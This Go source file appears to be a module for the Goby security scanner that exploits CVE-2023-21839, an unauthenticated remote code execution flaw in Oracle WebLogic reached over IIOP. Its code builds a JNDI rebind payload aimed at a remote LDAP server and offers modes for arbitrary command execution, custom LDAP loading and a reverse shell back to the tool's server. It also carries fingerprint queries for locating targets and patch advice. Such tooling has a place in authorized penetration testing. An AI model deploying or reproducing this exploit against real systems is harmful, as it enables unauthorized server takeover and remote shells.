package exploits

import (
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/jsonvul/protocols"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Weblogic ForeignOpaqueReference  Remote Code Execution Vulnerability (CVE-2023-21839)",
    "Description": "<p>WebLogic Server is one of the application server components applicable to cloud and traditional environments.</p><p>WebLogic has a remote code execution vulnerability, which allows an unauthenticated attacker to access and destroy the vulnerable WebLogic Server through the IIOP protocol network. A successful exploitation of the vulnerability can cause the WebLogic Server to be taken over by the attacker, resulting in remote code execution.</p>",
    "Product": "Weblogic_interface_7001",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2023-01-18",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "3",
    "Impact": "<p>WebLogic has a remote code execution vulnerability, which allows an unauthenticated attacker to access and destroy the vulnerable WebLogic Server through the IIOP protocol network. A successful exploitation of the vulnerability can cause the WebLogic Server to be taken over by the attacker, resulting in remote code execution.</p>",
    "Recommendation": "<p>1. At present, the manufacturer has released an upgrade patch to fix the vulnerability. Please install the patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.oracle.com/security-alerts/cpujan2023.html\">https://www.oracle.com/security-alerts/cpujan2023.html</a></p><p>2. Temporary mitigation measures: (may affect business, please back up before operating)</p><p>This vulnerability can be mitigated by turning off the IIOP protocol. The operation is as follows: In the Weblogic console, select 'Services' - 'AdminServer' - 'Protocols' and uncheck 'Enable IIOP'. And restart the Weblogic project for the configuration to take effect.</p>",
    "References": [
        "https://www.oracle.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackMode",
            "type": "createSelect",
            "value": "cmd,ldap,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackMode=cmd"
        },
        {
            "name": "ldap_addr",
            "type": "input",
            "value": "ldap://xxx.com/exp",
            "show": "attackMode=ldap"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-21839"
    ],
    "CNNVD": [
        "CNNVD-202208-2240"
    ],
    "CNVD": [
        "CNVD-2023-04389"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Weblogic ForeignOpaqueReference 反序列化远程代码执行漏洞（CVE-2023-21839）",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。</p><p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过IIOP协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。</p>",
            "Recommendation": "<p>1、目前厂商已发布升级补丁以修复漏洞，请用户安装补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://www.oracle.com/security-alerts/cpujan2023.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpujan2023.html</a></p><p>2、临时缓解措施：（可能影响业务，请备份后再操作）</p><p>可通过关闭 IIOP 协议对此漏洞进行缓解。操作如下： 在 Weblogic 控制台中，选择 服务-&gt; AdminServer -&gt; 协议 ，取消 启用 IIOP 的勾选。 并重启 Weblogic 项目，使配置生效。</p>",
            "Impact": "<p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过IIOP协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Weblogic ForeignOpaqueReference  Remote Code Execution Vulnerability (CVE-2023-21839)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server is one of the application server components applicable to cloud and traditional environments.</p><p>WebLogic has a remote code execution vulnerability, which allows an unauthenticated attacker to access and destroy the vulnerable WebLogic Server through the IIOP protocol network. A successful exploitation of the vulnerability can cause the WebLogic Server to be taken over by the attacker, resulting in remote code execution.</p>",
            "Recommendation": "<p>1. At present, the manufacturer has released an upgrade patch to fix the vulnerability. Please install the patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.oracle.com/security-alerts/cpujan2023.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpujan2023.html</a></p><p>2. Temporary mitigation measures: (may affect business, please back up before operating)</p><p>This vulnerability can be mitigated by turning off the IIOP protocol. The operation is as follows: In the Weblogic console, select 'Services' - 'AdminServer' - 'Protocols' and uncheck 'Enable IIOP'. And restart the Weblogic project for the configuration to take effect.</p>",
            "Impact": "<p>WebLogic has a remote code execution vulnerability, which allows an unauthenticated attacker to access and destroy the vulnerable WebLogic Server through the IIOP protocol network. A successful exploitation of the vulnerability can cause the WebLogic Server to be taken over by the attacker, resulting in remote code execution.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7315"
}`

	// 生成 payload
	getPayloadFlaga35o := func(ldapUrl string, bindName string) []byte {
		var bodyEnd string
		bindName = hex.EncodeToString([]byte(bindName))
		bindNameLength := len(bindName) / 2
		bindNameLengthHex := fmt.Sprintf("%x", bindNameLength)
		if bindNameLength < 16 {
			bindNameLengthHex = "0" + bindNameLengthHex
		}
		bodyEnd = "00000001000000" + bindNameLengthHex + bindName + "0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a443233374439314342324630463638413a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000000000"
		//fmt.Println(url)
		//ldapUrl := "ldap://" + url
		ldapLength := strconv.FormatInt(int64(len(ldapUrl)), 16)
		ldapAddr := []byte(ldapUrl)
		hexLdapAddr := hex.EncodeToString(ldapAddr)
		bodyEndBytes, _ := hex.DecodeString(bodyEnd + ldapLength + hexLdapAddr)
		return bodyEndBytes
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ldapToken := goutils.RandomHexString(4)
			bindName := goutils.RandomHexString(3)
			ldapURL, _ := godclient.GetGodLDAPCheckURL("U", ldapToken)
			if err := protocols.NewIIOP(u.HostInfo, func(iiop *protocols.IIOP) error {
				if _, err := iiop.Rebind(getPayloadFlaga35o(ldapURL, bindName)); err != nil {
					return err
				}
				if _, err := iiop.Lookup(bindName); err != nil {
					return err
				}
				return nil
			}); err != nil {
				return false
			}
			return godclient.PullExists(ldapToken, 20*time.Second)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackMode := goutils.B2S(stepLogs.Params["attackMode"])
			ldapURL := ""
			var waitSessionCh chan string
			if attackMode == "cmd" {
				// 执行命令
				ldapURL = "ldap://" + godclient.GetGodServerHost() + "/A3"
			} else if attackMode == "ldap" {
				// 执行自定义 LDAP
				ldapURL = goutils.B2S(stepLogs.Params["ldap_addr"])
			} else if attackMode == "reverse" {
				waitSessionCh = make(chan string)
				// 构建反弹Shell LDAP
				if rp, err := godclient.WaitSession("reverse_java", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
					expResult.Output = err.Error()
					return expResult
				} else {
					ldapURL = "ldap://" + godclient.GetGodServerHost() + "/E" + godclient.GetKey() + rp
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			bindName := goutils.RandomHexString(3)
			if err := protocols.NewIIOP(expResult.HostInfo.HostInfo, func(iiop *protocols.IIOP) error {
				var stub []byte
				if attackMode == "cmd" {
					stub, _ = iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b")
				}
				// 存根读取失败或者执行方式非等于cmd
				if stub == nil || len(stub) == 0 || attackMode != "cmd" {
					// rebind
					if _, err := iiop.Rebind(getPayloadFlaga35o(ldapURL, bindName)); err != nil {
						return err
					}
					// lookup,反弹会占用连接导致超时
					if _, err := iiop.Lookup(bindName); err != nil && attackMode != "reverse" {
						return err
					}
				}
				if attackMode == "cmd" {
					if len(stub) == 0 || stub == nil {
						if newStub, err := iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b"); err != nil {
							return err
						} else {
							stub = newStub
						}
					}
					if rsp, err := iiop.Exec(stub, goutils.B2S(stepLogs.Params["cmd"])); err != nil {
						return err
					} else {
						expResult.Success = true
						expResult.Output = rsp
						return nil
					}
				} else if attackMode == "ldap" {
					expResult.Success = true
					expResult.Output = "Check LDAP Address : " + ldapURL + " ok!"
					return nil
				} else if attackMode == "reverse" {
					// 执行反弹
					// 执行reverse 检测
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
							return nil
						}
					case <-time.After(time.Second * 10):
						return errors.New("反弹失败")
					}
				} else {
					expResult.Success = false
					return errors.New("未知的利用方式")
				}
				return nil
			}); err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			} else {
				return expResult
			}
		}))
}
